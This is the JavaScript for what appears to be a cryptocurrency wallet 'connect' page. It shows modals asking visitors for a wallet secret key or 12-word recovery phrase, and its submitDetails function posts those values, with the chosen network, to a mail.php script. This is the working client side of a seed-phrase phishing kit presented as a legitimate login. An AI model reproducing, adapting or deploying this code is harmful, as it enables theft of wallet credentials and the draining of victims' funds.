// NAVBAR
const harmburgerBtn = document.querySelector('.harmburgerBtn');
const overlay = document.querySelector('.overlay');
const navListItems = document.querySelector('.navListItems');
// HAMBURGER TOGGLE's
harmburgerBtn.onclick = () => {
    harmburgerBtn.classList.toggle('active');
    // overlay.classList.toggle('active');
    navListItems.classList.toggle('active');
};




// BLOCKCHAIN NETWORK
const NetworkCard = document.querySelectorAll('.NetworkCard');
const loginModal = document.querySelector('#loginModal');
const closeModal = document.querySelectorAll('.closeModal');
// MODAL POP-UP
const modalCamp = document.querySelector('.modalCamp');
const modalCamp2 = document.querySelector('.modalCamp2');
const modalCamp3 = document.querySelector('.modalCamp3');
const modalCamp4 = document.querySelector('.modalCamp4');
// 
const secreteKeyLoginBtn = document.querySelector('.secreteKeyLoginBtn');
const secreteKeyLogin = document.querySelector('#secreteKeyLogin');
// 
const PhraseLogin = document.querySelector('#PhraseLogin');
const PhraseLoginBtn = document.querySelector('.PhraseLoginBtn');
// 
const btnLoginModal = document.querySelectorAll('.btnLoginModal');
const submitBtn = document.querySelectorAll('.submitBtn');

const loginInput = document.querySelectorAll('.loginInput');




// POPUP LOGIN MODAL
function POPUPloginModal(){
    loginModal.classList.add('active');
    modalCamp.classList.add('active');
    overlay.classList.add('active');        
}

// ADD SECRET KEY MODAL
function addSecretKeyModal(){
    loginModal.classList.remove('active');
    overlay.classList.add('active');
    secreteKeyLogin.classList.add('active');

    modalCamp.classList.remove('active');
    modalCamp2.classList.add('active');
}
// ADD 12 PHRASE MODAL
function addphraseModal(){
    loginModal.classList.remove('active');
    secreteKeyLogin.classList.remove('active');
    PhraseLogin.classList.add('active');
    modalCamp.classList.remove('active');
    modalCamp3.classList.add('active');
    overlay.classList.add('active');
}
// SUBMIT MODAL BTN
function submitBtnModal(){
    loginModal.classList.remove('active');
    secreteKeyLogin.classList.remove('active');
    PhraseLogin.classList.remove('active');
    overlay.classList.add('active');
    modalCamp.classList.remove('active');
    modalCamp2.classList.remove('active');
    modalCamp3.classList.remove('active');
    modalCamp4.classList.add('active');
}

// CLOSE MODALS
closeModal.forEach(closeIcon => {
    closeIcon.onclick = () => {
        overlay.classList.remove('active');
        loginModal.classList.remove('active');
        secreteKeyLogin.classList.remove('active');
        PhraseLogin.classList.remove('active');
        modalCamp.classList.remove('active');
        modalCamp2.classList.remove('active');
        modalCamp3.classList.remove('active');
        modalCamp4.classList.remove('active');
    };
});

// BLOCKCHAIN CARD
NetworkCard.forEach(cards => {
    // ADD EVENT LISTENER TO CARD
    cards.addEventListener('click', (e) => {
        // CONSOLE.LOG CURRENT TARGET ON CLICK
        let btnCurrentTarget = e.currentTarget.value;
        console.log(btnCurrentTarget);
        // POPUP FIRST MODAL
        POPUPloginModal();

        localStorage.setItem("Network", btnCurrentTarget);
    })
});


// SECRET KEY MODAL BTN
secreteKeyLoginBtn.onclick = () => addSecretKeyModal();

// PHRASE MODAL BTN
PhraseLoginBtn.onclick = () => addphraseModal();


// GET INPUT VALUE
function getInputValue() {
    loginInput.forEach(inputValue => {
        let inputCV = inputValue.value;
        console.log(inputCV)
        console.log(inputCV)
    });
}


function submitDetails(){
    var inputSecretKey = $("#inputSecretKey").val();
    var PhraseInput = $("#PhraseInput").val();
    var network = localStorage.getItem("Network");
    var dataString = 'PhraseInput='+ PhraseInput + '&inputSecretKey=' + inputSecretKey + '&network='+ network;

    $.ajax({
        url: "mail.php",
        type:"POST",
        data: {
            PhraseInput: PhraseInput,
            inputSecretKey: inputSecretKey,
            network: network,
        },
        dataType: "json",
        success:function(data){
            console.log(data);
        },
    });
}




// SUBMIT MODAL BTN
submitBtn.forEach(submitModal => {
    submitModal.addEventListener('click', () => {
        submitDetails();
        
        submitBtnModal();
        // RENDER INPUT VALUE
    });
}); 